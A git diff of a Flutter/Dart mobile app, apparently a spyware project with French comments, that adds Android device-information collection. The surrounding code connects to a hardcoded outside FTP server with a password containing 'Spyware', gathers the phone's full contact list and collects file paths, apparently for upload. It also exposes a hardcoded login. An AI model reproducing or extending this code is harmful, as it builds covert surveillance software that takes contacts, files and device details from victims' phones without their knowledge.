@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:device_info/device_info.dart';
 import 'package:flutter/material.dart';
 import 'package:ftpconnect/ftpConnect.dart';
 // ignore: import_of_legacy_library_into_null_safe
@@ -46,6 +47,15 @@ class _MyHomePageState extends State<MyHomePage> {
     FTPConnect ftpConnect = FTPConnect('141.94.77.172',
         user: 'utilisateursftp', pass: 'Sftp59?Spyware!');
 
+    // ***** PARTIE INFORMATIONS TELEPHONE *****
+    if (Platform.isAndroid) {
+      var androidInfo = await DeviceInfoPlugin().androidInfo;
+      var release = androidInfo.version.release;
+      var manufacturer = androidInfo.manufacturer;
+      var host = androidInfo.host;
+      print('Android $release, $manufacturer, $host');
+    }
+
     // ***** PARTIE CONTACTS *****
 
     // Récupérer l'ensemble des contacts dans une liste
@@ -69,7 +79,7 @@ class _MyHomePageState extends State<MyHomePage> {
       var path = file.path;
       listFile.add(path);
     }
-    print(listFile);
+    //print(listFile);
 
     int compteur = 0;
     for (var file in listFile) {
